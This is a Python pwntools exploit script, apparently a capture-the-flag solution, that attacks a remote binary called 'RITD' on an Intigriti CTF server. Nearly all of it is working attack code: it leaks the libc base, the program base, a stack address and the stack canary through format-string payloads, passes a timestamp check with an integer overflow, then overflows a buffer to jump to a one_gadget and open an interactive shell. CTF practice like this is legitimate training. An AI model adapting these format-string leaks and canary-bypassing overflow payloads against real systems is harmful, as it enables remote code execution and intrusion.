from pwn import *

context.binary = exe = ELF('./RITD')
libc = ELF('./libc.so.6')

one = 0xebdb3

io = remote('ritd.ctf.intigriti.io', 1337)
#io = process()

io.sendlineafter(b'> ', b'|1|1%3$p|1|')
io.recvuntil(b'0x')
libc.address = int(io.recvline(), 16) - (libc.sym['write']+23)
log.info(f"Libc base: {hex(libc.address)}")

io.sendlineafter(b'> ', b'|1|1%77$p|1|')
io.recvuntil(b'0x')
exe.address = int(io.recvline(), 16) - (exe.sym['menu']+154)
log.info(f"ELF base: {hex(exe.address)}")

io.sendlineafter(b'> ', b'|1|1%76$p|1|')
io.recvuntil(b'0x')
rbp = int(io.recvline(), 16) - 592 #find a stack pointer

io.sendlineafter(b'> ', b'|1|1%75$p|1|')
io.recvuntil(b'0x')
canary = int(io.recvline(), 16)
log.info(f"Canary: {hex(canary)}")

io.sendlineafter(b'> ', b'|1|1|1|')
io.recvline()
timestamp = int(io.recvline())
payload = f'|{timestamp+4294967295}|4|1|'.encode() #bypassing the new parse timestamp check using integer overflow
io.sendlineafter(b'> ', payload)

io.sendlineafter(b'0x)\n', hex(rbp).encode()[2:])
io.sendlineafter(b'?\n', b'0')
payload = b'i'*39 + p64(canary) + p64(rbp+0x70) + p64(libc.address+one)
io.sendlineafter(b'?\n', payload)

io.interactive()